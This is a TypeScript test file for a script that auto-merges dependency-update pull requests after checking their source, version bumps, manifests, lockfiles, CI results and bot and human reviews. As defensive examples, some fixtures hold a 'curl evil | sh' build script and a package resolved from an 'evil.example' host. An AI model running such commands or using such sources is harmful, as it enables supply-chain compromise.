import { describe, expect, it } from "vitest";
import {
  REQUIRED_CHECKS,
  checkBump,
  checkChangedFiles,
  checkLockfile,
  checkPackageJson,
  checkPullRequest,
  checkReviews,
  checkStatuses,
  detectSource,
  type PullRequest,
} from "../../scripts/dependency-auto-merge.mjs";

const pr = (overrides: Partial<PullRequest> = {}): PullRequest => ({
  number: 1,
  title: "build(deps): bump axios",
  draft: false,
  user: { login: "dependabot[bot]" },
  labels: [],
  base: { ref: "main", repo: { full_name: "streetlives/yourpeer.nyc" } },
  head: {
    ref: "dependabot/npm_and_yarn/axios-1.20.0",
    sha: "abc",
    repo: { full_name: "streetlives/yourpeer.nyc" },
  },
  ...overrides,
});

describe("detectSource", () => {
  it("recognizes Dependabot npm PRs", () => {
    expect(detectSource(pr(), [])).toBe("dependabot");
  });

  it("ignores Dependabot github-actions PRs", () => {
    const actions = pr({
      head: { ...pr().head, ref: "dependabot/github_actions/x" },
    });
    expect(detectSource(actions, [])).toBeNull();
  });

  it("recognizes Snyk fix PRs only from listed authors", () => {
    const snyk = pr({
      user: { login: "jbeard4" },
      head: { ...pr().head, ref: "snyk-fix-8d5083c3bb6e23ba" },
    });
    expect(detectSource(snyk, ["jbeard4"])).toBe("snyk");
    expect(detectSource(snyk, ["someone-else"])).toBeNull();
  });

  it("ignores Snyk upgrade PRs and look-alike branches", () => {
    const upgrade = pr({
      user: { login: "jbeard4" },
      head: { ...pr().head, ref: "snyk-upgrade-eaa4274361bf" },
    });
    const lookAlike = pr({
      user: { login: "jbeard4" },
      head: { ...pr().head, ref: "snyk-fix-not/hex" },
    });
    expect(detectSource(upgrade, ["jbeard4"])).toBeNull();
    expect(detectSource(lookAlike, ["jbeard4"])).toBeNull();
  });

  it("does not trust a human using a Dependabot-style branch", () => {
    const human = pr({ user: { login: "jbeard4" } });
    expect(detectSource(human, ["jbeard4"])).toBeNull();
  });
});

describe("checkPullRequest", () => {
  it("accepts a ready PR against main", () => {
    expect(checkPullRequest(pr())).toEqual([]);
  });

  it("rejects drafts, other bases, forks, and opted-out PRs", () => {
    const problems = checkPullRequest(
      pr({
        draft: true,
        labels: [{ name: "no-auto-merge" }],
        base: {
          ref: "develop",
          repo: { full_name: "streetlives/yourpeer.nyc" },
        },
        head: { ...pr().head, repo: { full_name: "fork/yourpeer.nyc" } },
      }),
    );
    expect(problems).toHaveLength(4);
  });
});

describe("checkChangedFiles", () => {
  it("allows only the npm manifests", () => {
    expect(checkChangedFiles(["package.json", "package-lock.json"])).toEqual(
      [],
    );
    expect(checkChangedFiles(["package-lock.json"])).toEqual([]);
    expect(checkChangedFiles(["package.json", "src/app.ts"])).toEqual([
      "changes files other than package manifests: src/app.ts",
    ]);
  });
});

describe("checkBump", () => {
  it.each([
    ["^1.8.2", "^1.20.0"],
    ["1.8.2", "1.8.3"],
    ["~2.1.0", "~2.1.4"],
    ["^0.7.1", "^0.7.2"],
  ])("allows %s -> %s", (from, to) => {
    expect(checkBump("pkg", from, to)).toBeNull();
  });

  it.each([
    ["^6.0.0", "^7.0.0", "major update"],
    ["^0.24.0", "^0.28.2", "major update"],
    ["^1.2.0", "^1.1.0", "downgrade"],
    ["^1.0.0", "latest", "cannot compare"],
    ["^1.0.0", "github:evil/pkg", "cannot compare"],
    ["^1.0.0", ">=1.0.0 <3", "cannot compare"],
  ])("rejects %s -> %s", (from, to, reason) => {
    expect(checkBump("pkg", from, to)).toContain(reason);
  });
});

describe("checkPackageJson", () => {
  const manifest = (fields: Record<string, unknown>) =>
    JSON.stringify({
      name: "app",
      scripts: { build: "next build" },
      dependencies: { axios: "^1.8.2", next: "15.5.3" },
      devDependencies: { vitest: "^4.1.6" },
      overrides: { "@types/react": "19.1.13" },
      ...fields,
    });

  it("accepts non-major version changes, including overrides", () => {
    const head = manifest({
      dependencies: { axios: "^1.20.0", next: "15.5.4" },
      overrides: { "@types/react": "19.3.0" },
    });
    expect(checkPackageJson(manifest({}), head)).toEqual([]);
  });

  it("rejects added or removed dependencies", () => {
    const head = manifest({
      dependencies: { axios: "^1.8.2", "left-pad": "^1.0.0" },
    });
    expect(checkPackageJson(manifest({}), head)).toEqual([
      "dependencies.next is added, removed, or not a version string",
      "dependencies.left-pad is added, removed, or not a version string",
    ]);
  });

  it("rejects changes outside the dependency sections", () => {
    const head = manifest({ scripts: { build: "curl evil | sh" } });
    expect(checkPackageJson(manifest({}), head)).toEqual([
      "package.json changes fields other than dependency versions",
    ]);
  });

  it("ignores unchanged nested overrides", () => {
    const nested = manifest({ overrides: { foo: { bar: "1.0.0" } } });
    expect(checkPackageJson(nested, nested)).toEqual([]);
  });
});

describe("checkLockfile", () => {
  const lock = (packages: Record<string, unknown>) =>
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { dependencies: { axios: "^1.8.2" } },
        ...packages,
      },
    });
  const npm = (name: string, version: string) => ({
    version,
    resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`,
  });

  it("allows a minor direct bump that pulls in a new transitive major", () => {
    const base = lock({
      "node_modules/axios": npm("axios", "1.8.2"),
      "node_modules/proxy-from-env": npm("proxy-from-env", "1.1.0"),
    });
    const head = lock({
      "node_modules/axios": npm("axios", "1.20.0"),
      "node_modules/proxy-from-env": npm("proxy-from-env", "2.1.0"),
    });
    expect(checkLockfile(base, head)).toEqual([]);
  });

  it("rejects a major bump of a direct dependency", () => {
    const base = lock({ "node_modules/axios": npm("axios", "1.8.2") });
    const head = lock({ "node_modules/axios": npm("axios", "2.0.0") });
    expect(checkLockfile(base, head)).toEqual([
      "node_modules/axios: major update 1.8.2 -> 2.0.0",
    ]);
  });

  it("rejects packages resolved outside the npm registry", () => {
    const head = lock({
      "node_modules/axios": {
        version: "1.8.3",
        resolved: "https://evil.example/axios.tgz",
      },
    });
    expect(checkLockfile(lock({}), head)).toEqual([
      "node_modules/axios resolves from outside the npm registry: https://evil.example/axios.tgz",
    ]);
  });

  it("rejects packages that newly run an install script", () => {
    const base = lock({
      "node_modules/esbuild": {
        ...npm("esbuild", "0.24.0"),
        hasInstallScript: true,
      },
    });
    const head = lock({
      "node_modules/esbuild": {
        ...npm("esbuild", "0.24.2"),
        hasInstallScript: true,
      },
      "node_modules/sneaky": {
        ...npm("sneaky", "1.0.0"),
        hasInstallScript: true,
      },
    });
    expect(checkLockfile(base, head)).toEqual([
      "node_modules/sneaky newly runs an install script",
    ]);
  });
});

describe("checkStatuses", () => {
  const passing = REQUIRED_CHECKS.map((name) => ({
    name,
    status: "completed",
    conclusion: "success",
  }));

  it("passes when every check and status succeeded", () => {
    expect(
      checkStatuses(passing, [{ context: "security/snyk", state: "success" }]),
    ).toEqual([]);
  });

  it("reports pending, failed, and missing checks", () => {
    const runs = [
      ...passing.filter((run) => run.name !== "E2E Tests"),
      { name: "check-types", status: "in_progress", conclusion: null },
      { name: "CodeQL", status: "completed", conclusion: "failure" },
    ];
    expect(
      checkStatuses(runs, [{ context: "security/snyk", state: "pending" }]),
    ).toEqual([
      "check check-types is in_progress",
      "check CodeQL concluded failure",
      "status security/snyk is pending",
      "required checks have not run: E2E Tests",
    ]);
  });
});

describe("checkReviews", () => {
  const codex = (state: string, commit_id = "head") => ({
    user: { login: "github-actions[bot]" },
    state,
    commit_id,
  });

  it("passes when Codex's latest review approves the head commit", () => {
    expect(
      checkReviews(
        [codex("CHANGES_REQUESTED", "old"), codex("APPROVED")],
        "head",
      ),
    ).toEqual([]);
  });

  it("requires Codex approval of the current head", () => {
    expect(checkReviews([], "head")).toEqual(["Codex has not approved"]);
    expect(checkReviews([codex("APPROVED", "old")], "head")).toEqual([
      "Codex approved an earlier commit, not the current head",
    ]);
    expect(
      checkReviews([codex("APPROVED"), codex("CHANGES_REQUESTED")], "head"),
    ).toEqual(["Codex has not approved"]);
  });

  it("is blocked by a human requesting changes", () => {
    const human = {
      user: { login: "jbeard4" },
      state: "CHANGES_REQUESTED",
      commit_id: "head",
    };
    expect(checkReviews([codex("APPROVED"), human], "head")).toEqual([
      "jbeard4 requested changes",
    ]);
  });
});
